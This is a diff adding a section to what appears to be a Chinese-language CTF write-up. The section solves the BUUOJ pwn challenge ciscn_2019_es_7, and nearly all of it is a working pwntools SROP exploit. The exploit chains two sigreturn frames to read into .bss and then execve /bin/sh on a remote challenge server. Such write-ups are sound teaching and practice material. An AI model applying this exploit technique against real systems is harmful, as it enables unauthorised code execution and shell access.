@@ -614,3 +614,52 @@ if __name__ == "__main__":
     main()
 ```
 
+### ciscn_2019_es_7
+
+[题目链接](https://buuoj.cn/challenges#ciscn_2019_es_7)
+
+这题长的和 ciscn_2019_s_3 一模一样啊，显然的 SROP。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 29961
+io = remote(host,port)
+# io = process("./ciscn_2019_es_7")
+elf = ELF("./ciscn_2019_es_7")
+bss_addr = elf.bss() + 0x500
+# pop_rax_execve = 0x4004E2
+pop_rax_sigreturn = 0x4004DA
+syscall = 0x400517
+
+def main():
+    frame1 = SigreturnFrame()
+    frame1.rax = constants.SYS_read
+    frame1.rdi = 0  # stdin
+    frame1.rsi = bss_addr
+    frame1.rdx = 0x400
+    frame1.rsp = bss_addr 
+    frame1.rip = syscall
+    payload_1 = b'A'*0x10 + p64(pop_rax_sigreturn) + p64(syscall) + bytes(frame1)
+    io.send(payload_1)
+    io.recv(0x30)
+    sleep(0.1)
+    binsh = bss_addr + 0x108
+    frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall
+    payload_2 = p64(pop_rax_sigreturn) + p64(syscall) + bytes(frame2)
+    payload_2 = payload_2.ljust(0x108,b'\x00')
+    payload_2 = payload_2 + b"/bin/sh\x00"
+    io.send(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
